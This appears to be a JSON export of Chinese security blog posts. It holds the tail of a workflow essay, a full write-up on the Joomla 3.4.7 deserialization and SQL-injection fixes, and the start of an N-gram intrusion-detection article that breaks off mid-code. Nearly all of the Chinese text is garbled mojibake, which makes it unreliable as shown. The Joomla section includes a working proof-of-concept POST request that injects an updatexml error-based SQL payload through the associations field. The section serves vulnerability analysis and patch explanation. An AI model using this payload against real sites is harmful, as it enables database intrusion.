å®Œæˆæœ€ç»ˆçš„è¾“å‡ºè¿‡ç¨‹ï¼Œå¹¶å°†å®Œæˆçš„æ–‡ç« æ•´ç†åˆ°Notionï¼Œåœ¨Notionå¼ºå¤§çš„DatabaseåŠŸèƒ½åŠ æŒä¸‹ï¼Œåœ¨NotionåšçŸ¥è¯†æ•´ç†ä½“éªŒéå¸¸æ„‰æ‚¦ï¼›å¯ä»¥ä½“éªŒä¸‹å°‘æ¥ çš„[äº§å“æ²‰æ€å½•](https://pmthinking.com)ã€‚\r\n\r\n# æœ€å\r\n\r\nå¼•ç”¨å·¥ä½œæµçš„ç¥›é­…ï¼šä»å·¥å…·ã€é˜…è¯»åˆ°å†™ä½œ](https://sspai.com/post/71658)ä¸­å†™åˆ°çš„å†…å®¹ä½œä¸ºç»“å°¾ï¼š\r\n\r\nç¬¬ä¸€ï¼Œåœ¨å·¥ä½œæµä¸­ï¼Œ**å®è·µå…ˆè¡Œï¼Œç†å¿µä¼˜å…ˆäºå·¥å…·**ã€‚ä¸è¿‡ï¼Œå…³äºå·¥ä½œæµçº¯ç†å¿µæ€§çš„è®ºè¿°åŠ›æœ‰ä¸é€®ï¼Œæ•´ç¯‡æ–‡ç« ä¾ç„¶ä¸»è¦å›´ç»•å·¥å…·å’ŒæŠ€æœ¯åŠ ä»¥å±•å¼€ã€‚å¦å¤–ï¼Œé«˜æ•ˆç‡çš„å·¥ä½œæµè®¾è®¡å’Œè¿è¡Œè¿˜ä¼šæ¶‰åŠ**æ³¨æ„åŠ›ç®¡ç†ã€æ—¶é—´ç®¡ç†æˆ–è€…ç²¾åŠ›ç®¡ç†**ç­‰ç»´åº¦ï¼Œè¿™äº›å†…å®¹ä¹Ÿæ˜¯éœ€è¦åŠ ä»¥è¿›ä¸€æ­¥è€ƒè™‘çš„ã€‚\r\nç¬¬äºŒï¼Œ**å¯èƒ½ä¼šè¿‡äºæ‹”é«˜å·¥ä½œæµçš„é‡è¦æ€§**ã€‚å¦‚æœä½¿ç”¨åœºæ™¯æ¯”è¾ƒå•ä¸€ï¼Œéœ€è¦ä¸€ä¸ªäººé›†ä¸­ç²¾åŠ›å®Œæˆå•ä¸ªç®€å•é¡¹ç›®çš„æ—¶å€™ï¼Œé‚£ä¹ˆå…ˆè¡ŒåŠ¨èµ·æ¥æ›´å¥½ï¼Œä¸éœ€è¦åˆ»æ„åœ¨æ„å·¥ä½œæµã€‚å¦‚æœå¤„ç†å·¥ä½œæµçš„ç²¾åŠ›æˆæœ¬è¶…è¿‡äº†å·¥ä½œæœ¬èº«ï¼Œé‚£ä¹ˆå…ˆåœæ­¢æŠ˜è…¾å·¥ä½œæµï¼Œåœ¨å·¥ä½œå®è·µä¸­ä½ ä¼šé€æ­¥åŠ æ·±å¯¹äºè‡ªå·±å·¥ä½œæµçš„è®¤çŸ¥ã€‚\r\nç¬¬ä¸‰ï¼Œä¸€ä¸ªåˆé€‚çš„å·¥ä½œæµå¯¹äºä¸ªäººå’Œå›¢é˜Ÿè€Œè¨€è‡ªç„¶é‡è¦ï¼Œç„¶è€ŒåŒæ—¶ä¹Ÿ**éœ€è¦æ³¨æ„åˆ°å·¥ä½œæµæ˜¯ä¸€ç§ä¸­å¾®è§‚çš„æˆ˜æœ¯ç­–ç•¥ã€‚åœ¨å·¥ä½œæµä¹‹å¤–ï¼Œä¹Ÿéœ€è¦ä½¿ç”¨ä¸€äº›æ›´ä¸ºå®è§‚çš„æˆ˜ç•¥æ–¹æ¡ˆåŠ ä»¥æ”¯æ’‘**ã€‚æ¯”å¦‚ï¼Œä¸ªä½“éœ€è¦åŠæ—¶æ›´æ–°æ€ç»´æ–¹å¼ï¼Œä¼ä¸šéœ€è¦å»ºç«‹åˆé€‚çš„ç»„ç»‡æ¶æ„ã€‚\r\nç¬¬å››ï¼Œè¿™æ¡**é€šå¾€æ•ˆç‡ç”Ÿæ´»ä¹‹è·¯å¹¶æ²¡æœ‰æ­¢å¢ƒ**ï¼Œç†æƒ³çš„æ•ˆç‡ä¸ç”Ÿæ´»æœ¬èº«å¤„äº**åŠ¨æ€å¹³è¡¡**ä¹‹ä¸­ã€‚å¶å°”ä¼‘æ¯ï¼Œå›å¤´çœ‹çœ‹ç”šè‡³é€€å‡ æ­¥ä¹Ÿæœªå°ä¸æ˜¯å¥½äº‹ã€‚\r\n\r\nå…±å‹‰ã€‚"},{"fields":{"slug":"/åšå®¢/Archive/Joomla 3.4.7 ä¿®å¤çš„ååºåˆ—åŒ–ä¸SQLæ³¨å…¥/","title":"Joomla 3.4.7 ä¿®å¤çš„ååºåˆ—åŒ–ä¸SQLæ³¨å…¥"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Joomla 3.4.7 ä¿®å¤çš„ååºåˆ—åŒ–ä¸SQLæ³¨å…¥\r\ntags:\r\n  - åšå®¢\r\n  - webå®‰å…¨\r\n  - SQLæ³¨å…¥\r\n  - ååºåˆ—åŒ–\r\norder: 10000\r\n---\r\n\r\n## ååºåˆ—åŒ–æ¼æ´ä¿®å¤åˆ†æ\r\n\r\nå‰ä¸€é˜µå­ Joomla çš„å¯¹è±¡æ³¨å…¥å¾ˆç«ï¼Œè€Œå®˜æ–¹3.4.6çš„ä¿®å¤ä»…ä»…æ˜¯ä¸¥æ ¼è¿‡æ»¤äº†X_FORWARDED_FORã€æ³¨é‡Šäº†USER_AGENTå­˜å…¥SESSIONé‚£ä¸€å¥ï¼Œè§[è¿™é‡Œ](https://github.com/joomla/joomla-cms/commit/995db72ff4eaa544e38b4da3630b7a1ac0146264#diff-aba80b5850bf0435954b29dece250cbfL1021),è¿™æ ·åªæ˜¯æŒ‡å“ªè¡¥å“ªï¼Œæ²»æ ‡ä¸æ²»æœ¬ã€‚çœ‹æ¥å®˜æ–¹ä¸Šæ¬¡çš„ä¿®å¤åªæ˜¯ä¸´æ—¶è§£å†³æ–¹æ¡ˆï¼Œè¿™æ¬¡çš„æ›´æ–°(3.4.7)ç®—æ˜¯å½»åº•è§£å†³äº†æ­¤é—®é¢˜ã€‚\r\n\r\nä¸Šæ¬¡çš„å¯¹è±¡æ³¨å…¥ï¼Œéœ€è¦æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶ï¼š\r\n\r\n1. è‡ªå·±å®ç°sessionçš„å¤„ç†æ–¹å¼ï¼Œé‡æ–°å®ç°äº† session å­˜å‚¨çš„read()å’Œwrite()æ–¹æ³•ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å¯¹ session çš„å€¼è¿›è¡Œå®‰å…¨å¤„ç†ã€‚\r\n2. Mysqléstrict modeä¸‹ï¼Œä½¿ç”¨utf8mb4å­—ç¬¦Â `\\xF0\\x9D\\x8C\\x86`Â æ¥æˆªæ–­ã€‚\r\n3. PHP <= 5.6.13 sessionä¸­ååºåˆ—åŒ–è§£æçš„BUGã€‚\r\n\r\nJoomla å®˜æ–¹ä¹Ÿåªèƒ½è§£å†³ç¬¬ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯æ”¹è¿›sessionçš„å¤„ç†æ–¹å¼ã€‚è¿™æ¬¡æ›´æ–°ï¼Œåœ¨ libraries/cms/version/version.php ä¸­ï¼Œå°†SESSIONå­˜å‚¨åœ¨å†…éƒ¨çš„Registryç±»å¯¹è±¡ä¸­ï¼Œå¼ƒç”¨äº†ä»¥å‰ä½¿ç”¨ $_SESSION[$namespace][$name] çš„æ–¹å¼ï¼š\r\n\r\n```php\r\n$this->data = new \\Joomla\\Registry\\Registry;\r\n```\r\n\r\nå¹¶ä¸”ï¼Œåœ¨å†™SESSIONçš„æ—¶å€™ä¼šå…ˆåšbase64_encodeï¼š\r\n\r\n```php\r\npublic function close(){\r\n\tif ($this->_state !== 'active'){\r\n\t\t// @TODO :: generated error here\r\n\t\treturn false;\r\n\t}\r\n\t$session = JFactory::getSession();\r\n\t$data    = $session->getData();\r\n\r\n\t// Before storing it, let's serialize and encode the JRegistry object\r\n\t$_SESSION['joomla'] = base64_encode(serialize($data));\r\n\r\n\tsession_write_close();\r\n\treturn true;\r\n}\r\n```\r\n\r\nè¿™æ ·ï¼Œ$_SESSION å°±åªå‰©ä¸‹äº†$_SESSION[â€˜joomlaâ€™]ï¼Œè€Œä¸”$_SESSION[â€˜joomlaâ€™] åªå­˜å‚¨äº†Registryçš„å¯¹è±¡$dataï¼Œåœ¨æ‰§è¡Œread()å’Œwrite()æ—¶å€™ï¼ŒSESSIONæ˜¯ç»è¿‡base64_encodeåçš„æ•°æ®ï¼Œå°±ä¸ä¼šå­˜åœ¨read()ä¹‹åè‡ªåŠ¨ååºåˆ—åŒ–è€Œå¯¼è‡´å¯¹è±¡æ³¨å…¥äº†ã€‚\r\n\r\nåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¹Ÿä¸å­˜åœ¨unserializeå‚æ•°å¯æ§çš„æƒ…å†µã€‚ï¼ˆå¯æ§çš„åªæ˜¯$dataçš„æˆå‘˜å˜é‡ï¼‰\r\n\r\n```php\r\nif (isset($_SESSION['joomla']) && !empty($_SESSION['joomla'])){\r\n    $data = $_SESSION['joomla'];\r\n    $data = base64_decode($data);\r\n    $this->data = unserialize($data);\r\n}\r\n```\r\n\r\nJoomlaå®˜æ–¹è¿™æ¬¡çš„è§£å†³æ–¹æ¡ˆæ¯”è¾ƒå¥½ï¼Œä¸åƒä¸Šæ¬¡é‚£æ ·æ²»æ ‡ä¸æ²»æœ¬ï¼Œè¿™æ ·çš„æ€åº¦å€¼å¾—ç§°èµã€‚åè§‚Apacheå¯¹struts2 æ¼æ´çš„ä¿®å¤â€¦å°±ä¸è¯´äº†ã€‚\r\n\r\n## SQLæ³¨å…¥æ¼æ´åˆ†æ\r\n\r\n### æ¼æ´åˆ†æ\r\n\r\nä»£ç ä½äºï¼Œadministrator/components/com_categories/models/category.phpï¼Œsave()å‡½æ•°å†…ï¼š\r\n\r\n```php\r\n$assoc = $this->getAssoc();\r\n\r\nif ($assoc)\r\n{\r\n\t// Adding self to the association\r\n\t$associations = $data['associations'];\r\n\r\n\tforeach ($associations as $tag => $id)\r\n\t{\r\n\t\tif (empty($id))\r\n\t\t{\r\n\t\t\tunset($associations[$tag]);\r\n\t\t}\r\n\t}\r\n\r\n\t// Detecting all item menus\r\n\t$all_language = $table->language == '*';\r\n\r\n\tif ($all_language && !empty($associations))\r\n\t{\r\n\t\tJError::raiseNotice(403, JText::_('COM_CATEGORIES_ERROR_ALL_LANGUAGE_ASSOCIATED'));\r\n\t}\r\n\r\n\t$associations[$table->language] = $table->id;\r\n\r\n\t// Deleting old association for these items\r\n\t$db = $this->getDbo();\r\n\t$query = $db->getQuery(true)\r\n\t\t->delete('#__associations')\r\n\t\t->where($db->quoteName('context') . ' = ' . $db->quote($this->associationsContext))\r\n\t\t->where($db->quoteName('id') . ' IN (' . implode(',', $associations) . ')');\r\n\t$db->setQuery($query);\r\n\t$db->execute();\r\n\r\n\tif ($error = $db->getErrorMsg())\r\n\t{\r\n\t\t$this->setError($error);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tif (!$all_language && count($associations))\r\n\t{\r\n\t\t// Adding new association for these items\r\n\t\t$key = md5(json_encode($associations));\r\n\t\t$query->clear()\r\n\t\t\t->insert('#__associations');\r\n\r\n\t\tforeach ($associations as $id)\r\n\t\t{\r\n\t\t\t$query->values($id . ',' . $db->quote($this->associationsContext) . ',' . $db->quote($key));\r\n\t\t}\r\n\r\n\t\t$db->setQuery($query);\r\n\t\t$db->execute();\r\n\r\n\t\tif ($error = $db->getErrorMsg())\r\n\t\t{\r\n\t\t\t$this->setError($error);\r\n\r\n\t\t\treturn false;\r\n\t\t}\r\n\t}\r\n}\r\n```\r\n\r\nå…¶ä¸­çš„ $associations æœªç»è¿‡é€‚å½“å¤„ç†ã€æˆ‘ä»¬è·Ÿç€æµç¨‹æ¥çœ‹çœ‹ã€‚\r\n\r\né¦–å…ˆï¼Œ`$assoc = $this->getAssoc();`Â ä¸º True çš„æ—¶å€™æ•´ä¸ªé€»è¾‘æ‰èƒ½è¿›æ¥ï¼Œè¿™ä¸ª`getAssoc()`æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿè·Ÿè¿›getAssoc()çš„å®ç°(æ–‡ä»¶çš„ 1234 è¡Œ)ï¼Œå‘ç°å…³é”®æ˜¯åœ¨ï¼š\r\n\r\n```php\r\n$assoc = JLanguageAssociations::isEnabled();\r\n```\r\n\r\næœç´¢ä¸€ä¸‹ï¼Œå‘ç° JLanguageAssociations æ˜¯ Joomla çš„ä¸€ä¸ªå¤šè¯­è¨€æ’ä»¶Â [http://www.slideshare.net/erictiggeler/creating-a-multilingual-site-in-joomla-joomla-3-beginners-guide-eric-tiggeler](http://www.slideshare.net/erictiggeler/creating-a-multilingual-site-in-joomla-joomla-3-beginners-guide-eric-tiggeler), è¿™ä¸ªæ’ä»¶æ˜¯ Joomla è‡ªå¸¦çš„ï¼Œé»˜è®¤æ²¡æœ‰å¼€å¯ï¼Œæˆ‘ä»¬åœ¨åå°å°†ä»–å¼€å¯ã€‚\r\n\r\nç„¶åï¼Œç»§ç»­çœ‹ä»£ç ï¼Œ`$associations = $data['associations'];`, $dataæ˜¯postè¿‡æ¥çš„æ•°æ®ï¼Œ$associationsæ²¡æœ‰ç»è¿‡è¿‡æ»¤å°±ä¼ åˆ°äº†ï¼š\r\n\r\n```php\r\n$query = $db->getQuery(true)\r\n\t\t\t\t->delete('#__associations')\r\n\t\t\t\t->where($db->quoteName('context') . ' = ' . $db->quote($this->associationsContext))\r\n\t\t\t\t->where($db->quoteName('id') . ' IN (' . implode(',', $associations) . ')');\r\n```\r\n\r\nå¯¼è‡´SQLæ³¨å…¥ã€‚\r\n\r\né‚£ Joomla æœ‰æ²¡æœ‰å…¨å±€è¿‡æ»¤å‘¢ï¼Ÿæˆ‘ä»¬çœ‹çœ‹ Joomla æ˜¯å¦‚ä½•å¤„ç†POSTæ•°æ®çš„ã€‚\r\n\r\nåœ¨ libraries/legacy/controller/form.php , save() å‡½æ•°ï¼Œ\r\n\r\n```php\r\npublic function save($key = null, $urlVar = null){\r\n    ...\r\n    $data  = $this->input->post->get('jform', array(), 'array');\r\n    ...\r\n    $validData = $model->validate($form, $data);\r\n```\r\n\r\nvalidate() å‡½æ•°åœ¨ libraries/legacy/model/form.php 302è¡Œ, ä»–åˆè°ƒç”¨äº†libraries/joomla/form/form.php çš„filter() å‡½æ•°ï¼Œå…·ä½“å®ç°å°±ä¸ç»§ç»­äº†ï¼Œæ€»ä¹‹è¿™é‡Œçš„POSTå‚æ•°åªæ˜¯å¤„ç†äº† â€˜ XSS and specified bad code. â€˜ã€‚\r\n\r\næœ€åï¼Œæ„é€ POCã€‚åœ¨ä¿®æ”¹åˆ†ç±»ï¼Œä¿å­˜çš„æ—¶å€™ï¼Œä¿®æ”¹POSTæ•°æ®:\r\n\r\n```php\r\nPOST /Joomla/administrator/index.php?option=com_categories&extension=com_content&layout=edit&id=19\r\n\r\njform[title]=Joomla!&jform[alias]=joomla&jform[description]=&jform[parent_id]=14&jform[published]=1&jform[access]=1&jform[language]=*&jform[note]=&jform[version_note]=&jform[created_time]=2011-01-01+00:00:01&jform[created_user_id]=945&jform[modified_time]=2015-12-23+08:09:46&jform[modified_user_id]=945&jform[hits]=0&jform[id]=19&jform[metadesc]=&jform[metakey]=&jform[metadata][author]=&jform[metadata][robots]=&jform[associations][en-GB]=2) or updatexml(1,concat(0x7e,(version())),0) -- -&jform[rules][core.create][1]=&jform[rules][core.delete][1]=&jform[rules][core.edit][1]=&jform[rules][core.edit.state][1]=&jform[rules][core.edit.own][1]=&jform[rules][core.create][13]=&jform[rules][core.delete][13]=&jform[rules][core.edit][13]=&jform[rules][core.edit.state][13]=&jform[rules][core.edit.own][13]=&jform[rules][core.create][6]=&jform[rules][core.delete][6]=&jform[rules][core.edit][6]=&jform[rules][core.edit.state][6]=&jform[rules][core.edit.own][6]=&jform[rules][core.create][7]=&jform[rules][core.delete][7]=&jform[rules][core.edit][7]=&jform[rules][core.edit.state][7]=&jform[rules][core.edit.own][7]=&jform[rules][core.create][2]=&jform[rules][core.delete][2]=&jform[rules][core.edit][2]=&jform[rules][core.edit.state][2]=&jform[rules][core.edit.own][2]=&jform[rules][core.create][3]=&jform[rules][core.delete][3]=&jform[rules][core.edit][3]=&jform[rules][core.edit.state][3]=&jform[rules][core.edit.own][3]=&jform[rules][core.create][4]=&jform[rules][core.delete][4]=&jform[rules][core.edit][4]=&jform[rules][core.edit.state][4]=&jform[rules][core.edit.own][4]=&jform[rules][core.create][5]=&jform[rules][core.delete][5]=&jform[rules][core.edit][5]=&jform[rules][core.edit.state][5]=&jform[rules][core.edit.own][5]=&jform[rules][core.create][10]=0&jform[rules][core.delete][10]=&jform[rules][core.edit][10]=&jform[rules][core.edit.state][10]=&jform[rules][core.edit.own][10]=&jform[rules][core.create][12]=0&jform[rules][core.delete][12]=&jform[rules][core.edit][12]=&jform[rules][core.edit.state][12]=&jform[rules][core.edit.own][12]=&jform[rules][core.create][8]=&jform[rules][core.delete][8]=&jform[rules][core.edit][8]=&jform[rules][core.edit.state][8]=&jform[rules][core.edit.own][8]=&jform[params][category_layout]=&jform[params][image]=&jform[params][image_alt]=&jform[extension]=com_content&task=category.apply&2ebbc80d46dda42570c1b1699a58323d=1\r\n```\r\n\r\njform[associations][en-GB] è¿™ä¸ªå‚æ•°å°±æ˜¯ $associationsï¼ŒæˆåŠŸæ³¨å…¥ã€‚\r\n\r\n![Jommla](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/dWuY7g.jpg)\r\n\r\n> è¿™é‡Œæ‰“ä¸€æ³¢å¹¿å‘Šï¼Œæˆ‘ä»¬çš„Skywolfæ˜¯å¯ä»¥è½»æ¾æ£€æµ‹å‡ºæ¥çš„ï¼Œå¦‚ä¸‹å›¾\r\n\r\n![Skywolf](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/vwJyVt.jpg)\r\n\r\nå¦å¤–ï¼Œ`libraries/legacy/model/admin.php` è¿™é‡Œä¹Ÿå­˜åœ¨ç€åŒæ ·çš„é—®é¢˜ã€‚\r\n\r\n### ä¿®å¤æ–¹æ¡ˆ\r\n\r\nå®˜æ–¹å¢åŠ äº†ï¼š\r\n\r\n```php\r\n...\r\n$associations = Joomla\\Utilities\\ArrayHelper::toInteger($associations);\r\n...\r\n$query->values(((int) $id) . ',' . $db->quote($this->associationsContext) . ',' . $db->quote($key));\r\n...\r\n```\r\n\r\nå°† $associations ä¸­çš„æ‰€æœ‰å€¼è½¬æ¢ä¸ºintå‹ã€‚è¿˜æœ‰å°† $id å¼ºåˆ¶è½¬æ¢ä¸ºintã€‚\r\n\r\n## å‚è€ƒèµ„æ–™\r\n\r\n1. [http://drops.wooyun.org/papers/11330](http://drops.wooyun.org/papers/11330)\r\n2. [http://drops.wooyun.org/papers/11371](http://drops.wooyun.org/papers/11371)\r\n3. [http://bobao.360.cn/learning/detail/2501.html](http://bobao.360.cn/learning/detail/2501.html)\r\n4. [https://github.com/joomla/joomla-cms/commit/2cd4ef682f0cab6ff03200b79007a25f19c6690e](https://github.com/joomla/joomla-cms/commit/2cd4ef682f0cab6ff03200b79007a25f19c6690e)\r\n5. [https://www.joomla.org/announcements/release-news/5643-joomla-3-4-7.html](https://www.joomla.org/announcements/release-news/5643-joomla-3-4-7.html)\r\n\r\nâŒ¥E"},{"fields":{"slug":"/åšå®¢/Archive/N-gramåœ¨å®‰å…¨é¢†åŸŸçš„åº”ç”¨/","title":"N-gramåœ¨å®‰å…¨é¢†åŸŸçš„åº”ç”¨"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: N-gramåœ¨å®‰å…¨é¢†åŸŸçš„åº”ç”¨\r\ntags:\r\n  - åšå®¢\r\n  - æœºå™¨å­¦ä¹ \r\n  - å…¥ä¾µæ£€æµ‹\r\norder: 9996\r\n---\r\n\r\n## ä»€ä¹ˆæ˜¯N-Gramï¼Ÿ\r\n\r\nN-Gramæ˜¯ä¸€ç§åœ¨è‡ªç„¶è¯­è¨€å¤„ç†(NLP)ä¸­å¸¸ç”¨çš„ä¸€ç§æ¦‚ç‡è¯­è¨€æ¨¡å‹(Probabilistic Language Model)ï¼Œå¸¸ç”¨äºè¯­éŸ³\\æ‰‹å†™è¯†åˆ«ã€æœºå™¨ç¿»è¯‘ã€æ‹¼å†™çº é”™ç­‰ç­‰é¢†åŸŸã€‚\r\n\r\nå®ƒçš„æœ¬è´¨å°±æ˜¯è®¡ç®—ä¸€ä¸ªå¥å­æˆ–è€…ä¸€è¿ä¸²è¯å‡ºç°çš„æ¦‚ç‡ã€‚\r\n\r\n```python\r\n/*\r\nT æ˜¯ç”± W1,W2,W3,W4,W5 ... Wnç»„æˆçš„ä¸€ä¸ªå¥å­ã€‚\r\n*/\r\n\r\nP(T) = P(W1,W2,W3,W4,W5 ... Wn) //è¿™ä¸ªå¥å­å‡ºç°çš„æ¦‚ç‡æ˜¯é‡Œé¢æ¯ä¸€ä¸ªè¯å‡ºç°çš„æ¦‚ç‡çš„å åŠ ã€‚\r\n\r\nP(W5|W1,W2,W3,W4) //å·²ç»å‡ºç°ç¬¬1ä¸ªè‡³ç¬¬4ä¸ªçš„è¯çš„æƒ…å†µä¸‹ï¼Œç¬¬5ä¸ªè¯å‡ºç°çš„æ¦‚ç‡ã€‚\r\n```\r\n\r\næ¯”å¦‚ï¼š\r\n\r\n![Google](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/r9iFeU.jpg)\r\n\r\nI am working åé¢å¾ˆæœ‰å¯èƒ½å‡ºç°`at`,Â `in`,Â `for`Â ï¼Œè€Œä¸æ˜¯`refrigerator`,Â `throw`,Â `gull`ã€‚é‚£ä¹ˆå¦‚ä½•è®¡ç®—N-Gramså‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ä½¿ç”¨é“¾å¼æ³•åˆ™([Chain Rule](https://en.wikipedia.org/wiki/Chain_rule_(probability)))ï¼Œæ±‚å¤šä¸ªå…³è”äº‹ä»¶å¹¶å­˜æ—¶çš„æ¦‚ç‡ï¼š\r\n\r\n- 2ä¸ªäº‹ä»¶åŒæ—¶å‘ç”Ÿçš„æ¦‚ç‡ï¼š**P(a, b) = P(a | b) * P(b)**\r\n- 3ä¸ªäº‹ä»¶çš„æ¦‚ç‡é“¾å¼è°ƒç”¨ï¼š**P(a, b, c) = P(a | b, c) * P(b, c) = P(a | b, c) * P(b | c) * P(c)**\r\n- æ¨å¹¿åˆ°Nä¸ªäº‹ä»¶ï¼Œæ¦‚ç‡é“¾å¼æ³•åˆ™ä¸ºï¼š**P(X1, X2, ... Xn) = P(X1 | X2, X3 ... Xn) * P(X2 | X3, X4 ... Xn) ... P(Xn-1 | Xn) * P(Xn)**\r\n\r\nä½†æ˜¯è¿™æ ·ä¼šæœ‰ä¸¤ä¸ªé—®é¢˜ï¼š\r\n\r\n1. å‚æ•°ç©ºé—´è¿‡å¤§ï¼Œä¸å¯èƒ½å®ç”¨åŒ–ã€‚ï¼ˆNè¶Šå¤§è¶Šéš¾è®¡ç®—ï¼‰\r\n2. æ•°æ®ç¨€ç–ä¸¥é‡ï¼Œè¯­è¨€æœ‰å„ç§å„æ ·çš„ç»„åˆï¼Œæ•°æ®é‡å¤ªå¤§ï¼Œæ— æ³•è·å–è¿™ä¹ˆå…¨çš„æ•°æ®ã€‚\r\n\r\næ‰€ä»¥ä¸ºäº†ç®€åŒ–è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¼•å…¥é©¬å°”ç§‘å¤«å‡è®¾ï¼ˆMarkov Assumptionï¼‰ï¼šâ€ä¸€ä¸ªè¯çš„å‡ºç°ä»…ä»…ä¾èµ–äºå®ƒå‰é¢å‡ºç°çš„ä¸€ä¸ªæˆ–è€…æœ‰é™çš„å‡ ä¸ªè¯ã€‚â€\r\n\r\n1. å¦‚æœä¸€ä¸ªè¯çš„å‡ºç°ä»…ä»…ä¾èµ–äºå®ƒæœ¬èº«ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º Uni-gram model :Â `P(T) = P(W1)P(W2)...P(Wn)`\r\n2. å¦‚æœä¸€ä¸ªè¯çš„å‡ºç°ä»…ä»…ä¾èµ–äºå®ƒå‰é¢å‡ºç°çš„ä¸€ä¸ªè¯ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º Bi-gram model :Â `P(T) = P(W1)P(W2|W1)P(W3|W2)...P(Wn|Wn-1)`\r\n3. å¦‚æœä¸€ä¸ªè¯çš„å‡ºç°ä»…ä»…ä¾èµ–äºå®ƒå‰é¢å‡ºç°çš„ä¸¤ä¸ªè¯ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º Tri-gram model :Â `P(T) = P(W1)P(W3|W1,W2)...P(Wn|Wn-2,Wn-1)`\r\n4. ä¾æ¬¡ç±»æ¨åˆ°ä»…ä¾èµ–äºå®ƒå‰é¢å‡ºç°çš„Nä¸ªè¯ï¼Œè¿˜æœ‰4-gram, 5-gramã€‚\r\n\r\nä¸‹é¢ç”¨Bi-gramä¸¾ä¸ªä¾‹å­ï¼Œè¯­æ–™åº“æ¥è‡ªÂ [[Berkeley Restaurant Project]](http://www1.icsi.berkeley.edu/Speech/berp.html)Â ï¼Œæ€»è¯æ•°ä¸º 10132ã€‚\r\n\r\nè¯å’Œè¯é¢‘ç‡ï¼š\r\n\r\n| i | want | to | eat | chinese | food | lunch | spend |\r\n| --- | --- | --- | --- | --- | --- | --- | --- |\r\n| 2533 | 927 | 2417 | 746 | 158 | 1093 | 341 | 278 |\r\n\r\nè¯åºåˆ—é¢‘ç‡ï¼š\r\n\r\n| * | i | want | to | eat | chinese | food | lunch | spend |\r\n| --- | --- | --- | --- | --- | --- | --- | --- | --- |\r\n| i | 5 | 827 | 0 | 9 | 0 | 0 | 0 | 2 |\r\n| want | 2 | 0 | 608 | 1 | 6 | 6 | 5 | 1 |\r\n| to | 2 | 0 | 4 | 686 | 2 | 0 | 6 | 211 |\r\n| eat | 0 | 0 | 2 | 0 | 16 | 2 | 42 | 0 |\r\n| chinese | 1 | 0 | 0 | 0 | 0 | 82 | 1 | 0 |\r\n| food | 15 | 0 | 15 | 0 | 1 | 4 | 0 | 0 |\r\n| lunch | 2 | 0 | 0 | 0 | 0 | 1 | 0 | 0 |\r\n| spend | 1 | 0 | 1 | 9 | 0 | 0 | 0 | 0 |\r\n\r\næ ¹æ®ä¸Šè¡¨æˆ‘ä»¬å¯ä»¥ç›´è§‚çš„çœ‹å‡ºï¼Œåœ¨è¿™å…«ä¸ªè¯çš„ç»„åˆä¸­ï¼Œæ¦‚ç‡æœ€é«˜çš„å¥å­æ˜¯ï¼š i want to eat lunch ã€‚å®ƒçš„æ¦‚ç‡æ˜¯ P(i want to eat lunch) = P(i)P(want|i)P(to|want)P(eat|to)P(lunch|eat) = 2533/10132Â * *827/2533*Â * 608/927Â * *686/2417*Â * 42/746 = 0.25Â * *0.326*Â * 0.656Â * *0.284*Â * 0.056 = 0.00085\r\n\r\n### Smoothing\r\n\r\néšç€N-Gramsçš„Nçš„å¢å¤§ï¼ŒN-Gramsçš„æ•°é‡å¯¹è¶Šæ¥è¶Šå¤šã€‚å¦‚æœè¯è¡¨ä¸­æœ‰10000ä¸ªè¯ï¼ŒBi-Gramæ¨¡å‹å¯èƒ½äº§ç”Ÿ100000000ä¸ªN-Gramï¼ŒTri-Gramæ¨¡å‹åˆ™å¯èƒ½äº§ç”Ÿ1000000000000ä¸ªN-Gramï¼Œé‚£ä¹ˆä¼šå‡ºç°(unseen events)ï¼Œè¯åº“ä¸­çš„æŸäº›è¯åœ¨è®­ç»ƒæ ·æœ¬ä¸­æ²¡æœ‰çš„æƒ…å†µï¼ˆæ¯”å¦‚`in`åœ¨è®­ç»ƒæ ·æœ¬ä¸­æ²¡æœ‰å‡ºç°åœ¨`turn`\r\nåé¢ï¼‰ã€‚ä¸ºäº†é¿å…åœ¨è¿™ç§æƒ…å†µä¸‹æ¦‚ç‡ä¸º0ï¼Œæˆ‘ä»¬ä½¿ç”¨Smoothingæ¥è§£å†³ã€‚\r\n\r\n1. add-1 smoothing : å¾ˆç®€å•ï¼Œç»™æ‰€æœ‰ç»Ÿè®¡çš„countsåŠ  1 ã€‚\r\n2. add-k smoothing : å°†é«˜æ¦‚ç‡åˆ†åˆ°unseen eventsï¼Œåœ¨è®¡ç®—æ¦‚ç‡çš„æ—¶å€™ï¼Œé€‰æ‹©ä¸€ä¸ªåˆé€‚çš„kå€¼ã€‚\r\n    \r\n    ![add-k](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/MEKSo5.jpg)\r\n    \r\n3. backoff ï¼š å¦‚æœTri-gramç»Ÿè®¡ä¸º0ï¼Œå°±å»çœ‹Bi-gramï¼Œä»¥æ­¤ç±»æ¨ã€‚\r\n4. interpolation : ä»¥æƒé‡ï¼Œå°†Tri-gramï¼ŒBi-gramï¼ŒUni-gramç»¼åˆèµ·æ¥ã€‚ï¼ˆä¸¾ä¾‹ï¼‰\r\n5. kneser-ney smoothing : ä»¥åœ°ä½å‘é«˜ä½ï¼Œæˆ–è€…é«˜ä½å‘åœ°ä½çš„æ–¹å‘ï¼Œä¼ é€’é«˜é¢‘ã€‚\r\n\r\n## ä½¿ç”¨Pythonç”ŸæˆN-grams\r\n\r\nç®€å•çš„å®ç°ï¼š\r\n\r\n```python\r\nclass NGram(object):\r\n\tdef __init__(self, text, n=3):\r\n\t\tself.n = n\r\n\t\tself.table = {}\r\n\t\tself.parse_text(list(text), n)\r\n\r\n\tdef parse_text(self, text, n):\r\n\t\tfor 